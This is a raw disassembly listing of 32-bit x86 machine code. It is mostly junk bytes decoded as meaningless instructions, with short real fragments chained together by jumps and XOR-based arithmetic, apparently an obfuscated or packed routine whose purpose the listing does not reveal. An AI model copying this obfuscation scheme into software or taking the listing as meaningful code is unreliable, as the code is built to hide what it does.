  40c00b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c00c:	out    0x5a,eax
  40c00e:	gs mov dl,0xd0
  40c011:	(bad)  
  40c013:	loopne 0x40c060
  40c015:	adc    BYTE PTR [eax-0x7623b590],0xbb
  40c01c:	jb     0x40c04b
  40c01e:	or     esi,edx
  40c020:	ror    BYTE PTR [ebx],0x12
  40c023:	imul   edi,DWORD PTR [eax],0xb830ee63
  40c029:	add    BYTE PTR [ebx],0x80
  40c02c:	add    BYTE PTR [eax+eax*8-0x616d1e26],al
  40c033:	xor    al,0x1f
  40c035:	sub    BYTE PTR [ecx+edi*1],cl
  40c038:	mov    al,ds:0xb49b0d1e
  40c03d:	pop    ebx
  40c03e:	out    dx,eax
  40c03f:	aas    
  40c040:	push   ds
  40c041:	sbb    BYTE PTR [esi+eiz*4+0x1],bl
  40c045:	jmp    0x424f:0xf726dc58
  40c04c:	mov    WORD PTR [eax+0x15],?
  40c04f:	rcl    DWORD PTR [edi-0x60],1
  40c052:	push   cs
  40c053:	scas   eax,DWORD PTR es:[edi]
  40c054:	iret   
  40c055:	pop    es
  40c056:	jo     0x40c056
  40c058:	(bad)  
  40c059:	push   edx
  40c05a:	dec    esi
  40c05b:	cmp    bh,BYTE PTR [esi+0x75]
  40c05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c05f:	jmp    0x40c0d2
  40c061:	pop    ss
  40c062:	repnz test al,0x4a
  40c065:	xor    BYTE PTR [ebx+0x63],al
  40c068:	lds    edx,FWORD PTR [ebp+0x2d]
  40c06b:	inc    ecx
  40c06c:	bound  edi,QWORD PTR [ecx+0x22df65ea]
  40c072:	mov    dl,0xde
  40c074:	gs mov ebp,0xf7c71954
  40c07a:	or     DWORD PTR [esi+0x35f86717],ecx
  40c080:	adc    bh,BYTE PTR [ecx+0x7510859]
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	aad    0x68
  40c0e2:	lods   al,BYTE PTR ds:[esi]
  40c0e3:	test   al,0xe1
  40c0e5:	xor    eax,0x7eb67e7e
  40c0ea:	jle    0x40c16a
  40c0ec:	add    DWORD PTR [ebp-0x55],0x15
  40c0f0:	loope  0x40c08e
  40c0f2:	loopne 0x40c156
  40c0f4:	and    ebx,0x6f166955
  40c0fa:	cs sub esp,0xffffffe2
  40c0fe:	test   eax,0x8779c3d5
  40c103:	out    0xa,eax
  40c105:	adc    edi,ebp
  40c107:	addr16 test eax,0x7ec82f26
  40c10d:	pop    esi
  40c10e:	call   0xed88:0x25a4e857
  40c115:	repz sahf 
  40c117:	and    al,0x44
  40c119:	scas   eax,DWORD PTR es:[edi]
  40c11a:	ds pop ebp
  40c11c:	sar    ebp,1
  40c11e:	sbb    DWORD PTR [edi+esi*1],ebp
  40c121:	cmp    ch,BYTE PTR [edi-0x27]
  40c124:	push   edi
  40c125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c126:	cmp    BYTE PTR [edx-0x4f],dh
  40c129:	pop    eax
  40c12a:	bound  esp,QWORD PTR [ebx]
  40c12c:	cli    
  40c12d:	cmp    BYTE PTR [eax],dh
  40c12f:	xchg   ebp,esi
  40c131:	mov    dl,BYTE PTR [edi-0x3c]
  40c134:	xchg   esp,eax
  40c135:	mov    ecx,0x57e023fa
  40c13a:	jg     0x40c17d
  40c13c:	xchg   edi,eax
  40c13d:	sub    WORD PTR [eax+0x49402b34],bx
  40c144:	sahf   
  40c145:	xchg   BYTE PTR [edi-0x39],dl
  40c148:	or     BYTE PTR [ecx+0x4c],dl
  40c14b:	jge    0x40c113
  40c14d:	sub    ah,BYTE PTR [ebx+0x76a86f6f]
  40c153:	mov    edx,DWORD PTR [esi]
  40c155:	mov    eax,ds:0x63a375d7
  40c15a:	cwde   
  40c15b:	push   ecx
  40c15c:	ja     0x40c10b
  40c15e:	xchg   edi,eax
  40c15f:	iret   
  40c160:	pop    ebp
  40c161:	stos   DWORD PTR es:[edi],eax
  40c162:	cmp    DWORD PTR [edi+ebp*1],0x9930199a
  40c169:	jmp    0xfe7d9c95
  40c16e:	js     0x40c10e
  40c170:	adc    BYTE PTR [ebx+0x68],bl
  40c173:	inc    edi
  40c174:	ss push cs
  40c176:	clc    
  40c177:	pop    DWORD PTR [eax]
  40c179:	mov    edx,0x19bf9c9c
  40c17e:	jbe    0x40c1e7
  40c180:	cmp    eax,ebx
  40c182:	das    
  40c183:	fcmovb st,st(6)
  40c185:	push   edi
  40c186:	add    ebx,esi
  40c188:	sahf   
  40c189:	mov    dh,0x98
  40c18b:	les    ebx,FWORD PTR [edx+esi*2]
  40c18e:	and    bl,BYTE PTR [edx+esi*1-0x7c]
  40c192:	in     eax,dx
  40c193:	mov    cl,BYTE PTR [eax-0x31e71dc3]
  40c199:	dec    edi
  40c19a:	inc    esi
  40c19b:	cmp    cl,bh
  40c19d:	les    ebp,FWORD PTR ds:0x62b21e41
  40c1a3:	clc    
  40c1a4:	je     0x40c18f
  40c1a6:	retf   0xd366
  40c1a9:	xor    eax,DWORD PTR [edi+0x3b]
  40c1ac:	jmp    0x596d:0x83cb599b
  40c1b3:	mov    dl,0x8d
  40c1b5:	mov    WORD PTR [edx],cs
  40c1b7:	lahf   
  40c1b8:	jb     0x40c1ec
  40c1ba:	add    BYTE PTR [ebx],bh
  40c1bc:	enter  0x850f,0xcc
  40c1c0:	std    
  40c1c1:	(bad)  
  40c1c2:	dec    DWORD PTR [ebx+0xeae9de]
  40c1c8:	add    BYTE PTR [eax],al
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx-0x4f0062bb]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	and    ch,dh
  40c1ee:	mov    gs,esp
  40c1f0:	outs   dx,DWORD PTR ds:[esi]
  40c1f1:	sub    dl,dh
  40c1f3:	scas   eax,DWORD PTR es:[edi]
  40c1f4:	(bad)  
  40c1f5:	outs   dx,DWORD PTR ds:[esi]
  40c1f6:	sub    al,0x8a
  40c1f8:	sbb    BYTE PTR [ecx-0x69],bl
  40c1fb:	mov    bh,0x47
  40c1fd:	pusha  
  40c1fe:	cmp    dh,BYTE PTR [ebp+0x65c2d638]
  40c204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c205:	and    DWORD PTR [ebx+0x1e314f47],0x64
  40c20c:	ror    BYTE PTR [ebx-0x2e849a40],cl
  40c212:	pop    es
  40c213:	dec    esp
  40c214:	and    ebp,DWORD PTR [edx+0x0]
  40c217:	push   ecx
  40c218:	jle    0x40c295
  40c21a:	fadd   DWORD PTR [ecx]
  40c21c:	lds    esi,FWORD PTR [ecx+0x72]
  40c21f:	add    eax,0xae26a6dd
  40c224:	jno    0x40c1e7
  40c226:	enter  0xed21,0x74
  40c22a:	call   0xcd6b:0x3e2455b7
  40c231:	out    dx,al
  40c232:	push   esi
  40c233:	sahf   
  40c234:	ret    
  40c235:	stos   DWORD PTR es:[edi],eax
  40c236:	sbb    ah,BYTE PTR [edx+0x3e]
  40c239:	hlt    
  40c23a:	dec    esi
  40c23b:	mov    cl,0x1d
  40c23d:	jg     0x40c210
  40c23f:	mov    eax,DWORD PTR [edx+0x35]
  40c242:	mov    eax,ds:0xc7805be5
  40c247:	mov    ch,0xb0
  40c249:	(bad)  
  40c24a:	enter  0xcd3,0xed
  40c24e:	add    DWORD PTR [ecx],edx
  40c250:	dec    ecx
  40c251:	xchg   esp,esp
  40c253:	cdq    
  40c254:	cli    
  40c255:	lahf   
  40c256:	lods   eax,DWORD PTR ds:[esi]
  40c257:	daa    
  40c258:	js     0x40c27c
  40c25a:	(bad)  
  40c25b:	in     al,0x7
  40c25d:	mov    eax,0x6ccd62ec
  40c262:	jnp    0x40c205
  40c264:	push   0xea5f6b1b
  40c269:	sbb    esi,DWORD PTR [ecx+0x56ae1e3e]
  40c26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c270:	push   cs
  40c271:	mov    ebx,0x73c3aa95
  40c276:	jnp    0x40c261
  40c278:	sbb    dh,BYTE PTR [edi+0x5a7c2b11]
  40c27e:	ss pop esp
  40c280:	arpl   WORD PTR [edx+0x2232903a],si
  40c286:	pusha  
  40c287:	xlat   BYTE PTR ds:[ebx]
  40c288:	int    0x5
  40c28a:	mov    edi,0xf2824ff6
  40c28f:	adc    eax,0xcdc6999f
  40c294:	popf   
  40c295:	push   es
  40c296:	jmp    0x40c255
  40c298:	push   es
  40c299:	or     DWORD PTR [ecx-0x5],eax
  40c29c:	loopne 0x40c2ed
  40c29e:	inc    esi
  40c29f:	jle    0x40c2e6
  40c2a1:	es jmp 0x9541e7f8
  40c2a7:	adc    BYTE PTR [esp+esi*8-0x2a4a374c],bl
  40c2ae:	xchg   ebx,eax
  40c2af:	shl    BYTE PTR [edi],1
  40c2b1:	cmp    eax,DWORD PTR [ebx-0x3ba74c7]
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	jmp    0x40c345
  40c2db:	fbstp  TBYTE PTR [eax]
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	fs pop edx
  40c2e7:	mov    eax,0xc07a4ae3
  40c2ec:	out    0xa3,eax
  40c2ee:	cwde   
  40c2ef:	pusha  
  40c2f0:	pusha  
  40c2f1:	out    dx,eax
  40c2f2:	mov    ecx,0x4c836b91
  40c2f7:	data16 fdiv QWORD PTR [edi+ebp*4-0x13f0d866]
  40c2ff:	xor    DWORD PTR [ebp+0x2a0fe3b2],ecx
  40c305:	adc    al,0xd4
  40c307:	dec    al
  40c309:	mov    ds:0xdec5bf9f,eax
  40c30e:	jb     0x40c2fa
  40c310:	mov    dl,0x27
  40c312:	(bad)  
  40c313:	fisubr DWORD PTR [eax+0x5d]
  40c316:	loopne 0x40c2a0
  40c318:	daa    
  40c319:	imul   ebx,DWORD PTR [edi],0xc6556693
  40c31f:	xor    eax,0x274c513b
  40c324:	(bad)  
  40c325:	neg    BYTE PTR ds:0x6a83b0e1
  40c32b:	dec    ecx
  40c32c:	and    eax,0x80f12b69
  40c331:	ror    DWORD PTR [eax-0x5d],cl
  40c334:	or     ch,BYTE PTR [ebp-0x73]
  40c337:	pop    eax
  40c338:	not    BYTE PTR ds:0x83da0dd1
  40c33e:	(bad)  
  40c33f:	push   esi
  40c340:	or     BYTE PTR [ebx-0x6e],dh
  40c343:	addr16 mov ebp,0xa5c17111
  40c349:	cmp    esi,0x984eeba0
  40c34f:	jmp    0xfc54:0x7ee9c182
  40c356:	dec    edi
  40c357:	fs addr16 xor eax,0x652b6ec2
  40c35e:	mov    WORD PTR [ebp+ebx*2+0x5110252b],ds
  40c365:	sbb    ebx,0x1d53c6d3
  40c36b:	add    eax,0xd5a01d7d
  40c370:	fs inc ebp
  40c372:	or     BYTE PTR [ecx+0x13075908],bh
  40c378:	in     eax,dx
  40c379:	add    BYTE PTR [edx+0x6c44f08],dl
  40c37f:	jne    0x40c3f2
  40c381:	mov    ds:0x978f5ca5,eax
  40c386:	aad    0xc3
  40c388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c389:	test   eax,ebx
  40c38b:	mov    bh,0xaf
  40c38d:	adc    BYTE PTR [eax],al
  40c38f:	ret    
  40c390:	jmp    0x3577b2ea
  40c395:	gs inc ebx
  40c397:	xor    al,0x6a
  40c399:	test   DWORD PTR gs:[ecx+0x37a7ad66],edx
  40c3a0:	xchg   ecx,eax
  40c3a1:	outs   dx,BYTE PTR ds:[esi]
  40c3a2:	cdq    
  40c3a3:	push   esi
  40c3a4:	push   ebp
  40c3a5:	add    esi,DWORD PTR [ebx]
  40c3a7:	lds    edi,FWORD PTR [ebx-0x64fbb84e]
  40c3ad:	call   ebx
  40c3af:	xor    ebx,ebx
  40c3b1:	jmp    0x40c496
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0xc72e5fee,ecx
  40c3c3:	sub    eax,0xcb491d78
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	add    eax,0x45c2a593
  40c3d3:	fsubrp st(0),st
  40c3d5:	stos   DWORD PTR es:[edi],eax
  40c3d6:	leave  
  40c3d7:	jns    0x40c41c
  40c3d9:	and    esp,DWORD PTR [edi]
  40c3db:	clc    
  40c3dc:	xchg   esp,eax
  40c3dd:	inc    ecx
  40c3de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3df:	xchg   BYTE PTR [eax+0x58b360ca],bl
  40c3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e6:	sub    dh,dl
  40c3e8:	mov    ds:0x4b6d8262,al
  40c3ed:	cld    
  40c3ee:	or     ah,BYTE PTR [eax-0x3c502037]
  40c3f4:	call   0x12a670b4
  40c3f9:	mov    bl,0x11
  40c3fb:	jmp    0x40c47b
  40c3fd:	xchg   BYTE PTR [edi-0x14414598],bl
  40c403:	jp     0x40c46c
  40c405:	xchg   edi,eax
  40c406:	sbb    al,0x5f
  40c408:	daa    
  40c409:	push   ebx
  40c40a:	sub    eax,0xea7e244b
  40c40f:	xchg   edx,eax
  40c410:	repz and esp,DWORD PTR [edx-0x5f08127c]
  40c417:	call   0xdd2dba7b
  40c41c:	push   eax
  40c41d:	inc    esp
  40c41e:	fild   DWORD PTR [ebp-0x5e]
  40c421:	xor    al,0x82
  40c423:	xchg   ecx,eax
  40c424:	xchg   DWORD PTR [esp+esi*4+0x29],ebx
  40c428:	popa   
  40c429:	mov    esp,0xc15b268e
  40c42e:	mov    ah,0x4f
  40c430:	icebp  
  40c431:	sbb    eax,DWORD PTR ds:0x2d06f2eb
  40c437:	aad    0xca
  40c439:	ins    BYTE PTR es:[edi],dx
  40c43a:	mov    bl,0xcc
  40c43c:	out    0x1f,eax
  40c43e:	cwde   
  40c43f:	add    al,0x74
  40c441:	push   esp
  40c442:	ret    
  40c443:	cmp    BYTE PTR [edx],bl
  40c445:	iret   
  40c446:	mov    ds:0x14dede84,eax
  40c44b:	lods   al,BYTE PTR ds:[esi]
  40c44c:	call   0xe158624c
  40c451:	gs inc edi
  40c453:	cld    
  40c454:	sbb    eax,0x88fae79e
  40c459:	inc    edi
  40c45a:	xchg   BYTE PTR [edi-0x4],ah
  40c45d:	loop   0x40c484
  40c45f:	and    DWORD PTR ds:0x90c9e005,ebx
  40c465:	out    0xcc,al
  40c467:	mov    edx,0x9c0a0c27
  40c46c:	shl    BYTE PTR [esi+esi*8],1
  40c46f:	xchg   dh,dh
  40c471:	mov    ah,0x1f
  40c473:	in     eax,dx
  40c474:	sbb    eax,0x4cf0b830
  40c479:	test   DWORD PTR [ebx+ebp*2],esi
  40c47c:	pusha  
  40c47d:	cmp    DWORD PTR [eax-0x35],esp
  40c480:	out    0x9f,eax
  40c482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c483:	xchg   esp,eax
  40c484:	in     al,0xc8
  40c486:	cwde   
  40c487:	push   ss
  40c488:	aam    0xc
  40c48a:	stos   BYTE PTR es:[edi],al
  40c48b:	mov    BYTE PTR [ecx-0x3c890c0b],al
  40c491:	add    edi,DWORD PTR [edi+0x39]
  40c494:	add    BYTE PTR [edx+0x43],ch
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs dec esi
  40c4ac:	fxch   st(7)
  40c4ae:	or     eax,0x7e7ec881
  40c4b3:	mov    dh,0x7e
  40c4b5:	jle    0x40c535
  40c4b7:	xchg   DWORD PTR es:[edi-0x69],esi
  40c4bb:	push   ds
  40c4bc:	inc    ecx
  40c4bd:	sti    
  40c4be:	push   0x3123237a
  40c4c3:	outs   dx,DWORD PTR ds:[esi]
  40c4c4:	retf   
  40c4c5:	test   DWORD PTR [ecx],eax
  40c4c7:	and    BYTE PTR [ecx-0x7b],cl
  40c4ca:	xlat   BYTE PTR ds:[ebx]
  40c4cb:	fnsave [esi+ecx*1]
  40c4ce:	dec    edi
  40c4cf:	mov    BYTE PTR ds:0xd6353b03,cl
  40c4d5:	scas   al,BYTE PTR es:[edi]
  40c4d6:	push   0xa304134b
  40c4db:	and    eax,0x3c60cc0b
  40c4e0:	retf   
  40c4e1:	ins    DWORD PTR es:[edi],dx
  40c4e2:	jp     0x40c4cb
  40c4e4:	mov    ah,0x4
  40c4e6:	in     eax,0x4d
  40c4e8:	jmp    0x40c555
  40c4ea:	aad    0x68
  40c4ec:	fs ja  0x40c537
  40c4ef:	mov    ecx,0xf058fab2
  40c4f4:	sub    DWORD PTR [edi+0x27],ecx
  40c4f7:	sbb    DWORD PTR [edi+0x54e21b76],eax
  40c4fd:	ror    BYTE PTR [edx-0x24],0xae
  40c501:	mov    ecx,DWORD PTR [eax+eiz*8]
  40c504:	push   esp
  40c505:	enter  0xba53,0x85
  40c509:	sti    
  40c50a:	js     0x40c4f4
  40c50c:	mov    cl,0xc4
  40c50e:	pop    eax
  40c50f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c510:	xor    edi,DWORD PTR [esi]
  40c512:	cmp    BYTE PTR [ecx],ah
  40c514:	rcl    DWORD PTR [ecx],cl
  40c516:	push   ebp
  40c517:	lods   eax,DWORD PTR ds:[esi]
  40c518:	and    DWORD PTR [esi-0x7e9788b3],esi
  40c51e:	lahf   
  40c51f:	das    
  40c520:	and    eax,0x38ead924
  40c525:	jae    0x40c4ca
  40c527:	mov    ch,0xd
  40c529:	xor    BYTE PTR [eax+0x42253047],bh
  40c52f:	sbb    cl,BYTE PTR [eax-0x49]
  40c532:	ror    esp,0xff
  40c535:	pop    edx
  40c536:	push   cs
  40c537:	lock dec eax
  40c539:	aas    
  40c53a:	cmp    al,0x53
  40c53c:	sub    eax,0x3ec49a6f
  40c541:	dec    esp
  40c542:	das    
  40c543:	xor    cl,ch
  40c545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c546:	lds    edi,FWORD PTR [edi-0x26c20562]
  40c54c:	mov    ds,WORD PTR ds:0x5fb03dec
  40c552:	pop    es
  40c553:	inc    edx
  40c554:	jmp    0x86e7:0xc994919d
  40c55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55c:	cld    
  40c55d:	fwait
  40c55e:	inc    eax
  40c55f:	popf   
  40c560:	mov    ah,0x72
  40c562:	add    al,0x92
  40c564:	dec    ecx
  40c566:	xor    eax,0xbc76d6c1
  40c56b:	sub    BYTE PTR [ecx+0x29],cl
  40c56e:	inc    esi
  40c56f:	cmp    eax,0xd70c4d68
  40c574:	imul   esi,DWORD PTR [ecx],0x11
  40c577:	cmp    al,0x23
  40c579:	add    BYTE PTR [edi-0x493aa506],ah
  40c57f:	je     0x40c682
  40c585:	xchg   edx,eax
  40c586:	push   0xa
  40c588:	pop    ecx
  40c589:	push   0x4
  40c58b:	pop    ebx
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0xf1552c78
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	mov    ah,0x38
  40c5b2:	daa    
  40c5b3:	repz scas al,BYTE PTR es:[edi]
  40c5b5:	jbe    0x40c5c5
  40c5b7:	xchg   esp,eax
  40c5b8:	fs data16 jle 0x40c54e
  40c5bc:	ret    
  40c5bd:	shr    BYTE PTR [ebp+0x6c],1
  40c5c0:	ficomp DWORD PTR [esi+0xc]
  40c5c3:	mov    eax,ds:0xe8596aa8
  40c5c8:	aaa    
  40c5c9:	mov    dl,0xfe
  40c5cb:	inc    esp
  40c5cc:	and    ah,BYTE PTR [edx]
  40c5ce:	or     al,0x52
  40c5d0:	and    BYTE PTR ds:0x73b9b3a9,ch
  40c5d6:	mov    dl,0xb3
  40c5d8:	mov    DWORD PTR [ebp+0x569caef6],edx
  40c5de:	mov    BYTE PTR [esi-0x749f8759],ah
  40c5e4:	test   eax,0x2468261e
  40c5e9:	sbb    edx,esi
  40c5eb:	test   BYTE PTR [ecx-0xd],al
  40c5ee:	shr    DWORD PTR [esi+0x32e35348],cl
  40c5f4:	sub    DWORD PTR [esi+0xf872104],ebx
  40c5fa:	jle    0x40c5e1
  40c5fc:	ins    BYTE PTR es:[edi],dx
  40c5fd:	out    dx,al
  40c5fe:	jl     0x40c615
  40c600:	fcomip st,st(6)
  40c602:	aas    
  40c603:	jecxz  0x40c5ba
  40c605:	xchg   edi,edi
  40c607:	jns    0x40c62d
  40c609:	jge    0x40c60c
  40c60b:	pop    eax
  40c60c:	adc    dh,BYTE PTR [ecx]
  40c60e:	sub    eax,0xf441da4f
  40c613:	inc    esi
  40c614:	jbe    0x40c5d8
  40c616:	outs   dx,DWORD PTR ds:[esi]
  40c617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c618:	push   ds
  40c619:	ret    
  40c61a:	std    
  40c61b:	or     eax,0xcb6a4809
  40c620:	push   esp
  40c621:	dec    ebp
  40c622:	xchg   ebx,eax
  40c623:	imul   BYTE PTR [eax+0x2c6bcb85]
  40c629:	fwait
  40c62a:	ins    WORD PTR es:[edi],dx
  40c62c:	cmp    BYTE PTR [edi],dl
  40c62e:	pop    esi
  40c62f:	stos   BYTE PTR es:[edi],al
  40c630:	aam    0x2f
  40c632:	pop    ebp
  40c633:	clc    
  40c634:	mov    bl,0x46
  40c636:	or     ch,ah
  40c638:	icebp  
  40c639:	mov    ds:0x9a45db9c,eax
  40c63e:	xor    ecx,DWORD PTR [eax+0x2852023e]
  40c644:	test   eax,0x4974c402
  40c649:	cmp    ecx,DWORD PTR [eax+ebx*8+0x23e05e77]
  40c650:	mov    esi,0xe18dc43c
  40c655:	fdivr  st(7),st
  40c657:	xchg   edi,eax
  40c658:	jbe    0x40c5ea
  40c65a:	mov    dh,0xcd
  40c65c:	jo     0x40c6bd
  40c65e:	push   ds
  40c65f:	jp     0x40c6d5
  40c661:	aam    0xaa
  40c663:	jge    0x40c698
  40c665:	sbb    al,0x61
  40c667:	jbe    0x40c62d
  40c669:	ins    DWORD PTR es:[edi],dx
  40c66a:	cmp    esi,DWORD PTR [edx-0x5e6cba86]
  40c670:	xor    esi,0x7
  40c673:	sub    esp,DWORD PTR [ecx+eax*4]
  40c676:	jmp    0xfe4:0x458b4976
  40c67d:	scas   eax,DWORD PTR es:[edi]
  40c67e:	rol    DWORD PTR [ebx],0xe0
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
